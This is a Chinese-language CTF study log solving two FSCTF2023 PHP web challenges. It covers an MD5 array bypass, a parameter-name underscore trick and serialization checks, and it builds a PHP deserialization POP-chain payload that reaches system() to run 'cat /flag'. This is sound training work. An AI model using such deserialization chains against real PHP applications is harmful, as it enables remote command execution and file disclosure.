## 本周重点
### 1.FSCTF2023 ez_php1
```
 <?php
highlight_file(__FILE__);
error_reporting(0);
include "globals.php";
$a = $_GET['b'];
$b = $_GET['a'];
if($a!=$b&&md5($a)==md5($b))
{
    echo "!!!";
    $c = $_POST['FL_AG'];
    if(isset($c))
    {
        if (preg_match('/^.*(flag).*$/', $ja)) {
            echo 'You are bad guy!!!';
        }
            else {
                echo "Congratulation!!";
                echo $hint1;
            }
    }
    else {
        echo "Please input my love FL_AG";
    }
} else{
    die("game over!");
}
?>
game over!
```
get传参a和b让a，b值不同但md5相同，直接数组绕过就行
post传参FL_AG=flag但是php会把_转换成.但是可以传参FL[AG，php传参会把[转换成_
payload:
![e057bd581307ee5a82130bf0ae721707.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699528104307-03bd3cb8-1f13-4d09-999b-3886bd171b56.png#averageHue=%23fcfcfb&clientId=u72270d6e-ec62-4&from=paste&height=302&id=ubcc82822&originHeight=377&originWidth=771&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18131&status=done&style=none&taskId=u472919ec-d8fa-434e-9f41-4a5f2cb656d&title=&width=616.8)
得到下一关
` !!!Congratulation!!L0vey0U.php  `
```
 <?php
highlight_file(__FILE__);
error_reporting(0);
include "globals.php";
$FAKE_KEY = "Do you love CTF?";
$KEY = "YES I love";
$str = $_GET['str'];
echo $flag;
if (unserialize($str) === "$KEY")
{
    echo "$hint2";
}
?>
flag{This_is_fake_flag}
```
将$key的值序列化传入即可
```
<?php
$KEY = "YES I love"; 
echo(serialize($KEY));
?>s:10:"YES I love";
```
![868bd15f34e5cf5940a9c4e436e1bf36.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699528372209-b2541f92-19c7-4060-b2ab-b08e3d4eaa19.png#averageHue=%23f9f8f7&clientId=u72270d6e-ec62-4&from=paste&height=130&id=u0230c042&originHeight=163&originWidth=771&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14914&status=done&style=none&taskId=u8068fef8-a61c-46ec-8f07-f0a95e1c33a&title=&width=616.8)
进入下一关
` flag{This_is_fake_flag}P0int.php  `
```
<?php
highlight_file(__FILE__);
error_reporting(0);
class Clazz
{
    public $a;
    public $b;

    public function __wakeup()
    {
        $this->a = file_get_contents("php://filter/read=convert.base64-encode/resource=g0t_f1ag.php");
    }
    public function __destruct()
    {
        echo $this->b;
    }
}
@unserialize($_POST['data']);

?> 
```
反序列化会启动_wakeup方法我们给a传入new Clazz相当于销毁原对象构造新对象来触发_destruct方法，然后用指针将a的伪协议值赋给b
```
<?php
class Clazz
{
    public $a;
    public $b;
}
$A=new Clazz;
$A->a=new Clazz;
$A->b= &$A->a;
echo serialize($A);
?>O:5:"Clazz":2:{s:1:"a";O:5:"Clazz":2:{s:1:"a";N;s:1:"b";N;}s:1:"b";R:2;}
```
得到flag
` PD8NCiRGTEFHPSAiRkxBR3t5MHVfYXJlX2wwdmUhISEhfSINCj8+DQo=  `
```
<?
$FLAG= "FLAG{y0u_are_l0ve!!!!}"
?>
```
### 2.FSCTF2023 ez_php2
```
 <?php
highlight_file(__file__);
Class Rd{
    public $ending;
    public $cl;

    public $poc;
    public function __destruct()
    {
        echo "All matters have concluded";
        die($this->ending);
    }
    public function __call($name, $arg)
    {
        foreach ($arg as $key =>$value)
        {

            if($arg[0]['POC']=="1111")
            {
                echo "1";
                $this->cl->var1 = "system";
            }
        }
    }
}


class Poc{
    public $payload;

    public $fun;

    public function __set($name, $value)
    {
        $this->payload = $name;
        $this->fun = $value;
    }

    function getflag($paylaod)
    {
        echo "Have you genuinely accomplished what you set out to do?";
        file_get_contents($paylaod);
    }
}

class Er{
    public $symbol;
    public $Flag;

    public function __construct()
    {
        $this->symbol = True;
    }

    public function __set($name, $value)
    {
        $value($this->Flag);
    }


}

class Ha{
    public $start;
    public $start1;
    public $start2;
    public function __construct()
    {
        echo $this->start1."__construct"."</br>";
    }

    public function __destruct()
    {
        if($this->start2==="11111") {
            $this->start1->Love($this->start);
            echo "You are Good!";
        }
    }
}


if(isset($_GET['Ha_rde_r']))
{
    unserialize($_GET['Ha_rde_r']);
} else{
    die("You are Silly goose!");
}
?> You are Silly goose!
```
首先根据变量start可知Ha类为链子开始，然后会触发_construct和_destruct方法，在后者里有个判断语句，需要给start2赋值"11111"然后触发了Love()函数，触发不存在的函数会调用_call方法，而只有Rd里有_call方法，所以咱第二步通过start1转到Rd中，在call方法中有个判断语句，让$arg[0]['POC']=="1111"成立，根据网上wp说这里需要通过$payload依靠变量覆盖[''=>'']来实现（贴个变量覆盖的文章：[https://blog.csdn.net/weixin_39831567/article/details/115982842](https://blog.csdn.net/weixin_39831567/article/details/115982842)）然后全部完成会触发$this->cl->var1 = "system";给未定义的类赋值触发_set魔术方法，_set在Er类里最后调用Er类，同时这个system会到set里的$value里，所以我们给Flag赋值system执行语句就行，构造payload:
```
<?php
Class Rd{
    public $ending;
    public $cl;
    public $poc;
}
class Poc{
    public $payload;
    public $fun;
}
class Er{
    public $symbol;
    public $Flag='cat /flag';
}
class Ha{
    public $start;
    public $start1;
    public $start2="11111";
}
$a=new Ha();
$a->start1=new Rd();
$poc=new Poc();
$poc->payload=['POC'=>'1111'];
$a->start=$poc->payload;
$a->start1->cl=new Er();
echo(serialize($a));
?>O:2:"Ha":3:{s:5:"start";a:1:{s:3:"POC";s:4:"1111";}s:6:"start1";O:2:"Rd":3:{s:6:"ending";N;s:2:"cl";O:2:"Er":2:{s:6:"symbol";N;s:4:"Flag";s:9:"cat /flag";}s:3:"poc";N;}s:6:"start2";s:5:"11111";}
```
先构造ls /看到flag
![78472c137fcacb12f25073e6577a668b.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699536682743-900ece12-d3c6-4354-9fe3-f17bc77a1c25.png#averageHue=%23fcfbfb&clientId=u72270d6e-ec62-4&from=paste&height=695&id=u9813521c&originHeight=869&originWidth=1917&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=126250&status=done&style=none&taskId=ue64068b3-6d87-4cee-9d6f-9e175351fe0&title=&width=1533.6)
再构造cat /flag传参得到flag
![302a73c4c3cb6c84d560dae770f041be.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1699534117037-91cb1201-8ea3-4448-b1e1-ad024992d250.png#averageHue=%23fdfcfc&clientId=u72270d6e-ec62-4&from=paste&height=699&id=u7e39b862&originHeight=874&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=119327&status=done&style=none&taskId=u598c6106-6dcb-46b2-b945-c24269de28b&title=&width=1534.4)
## 下周计划

- 

## 总结


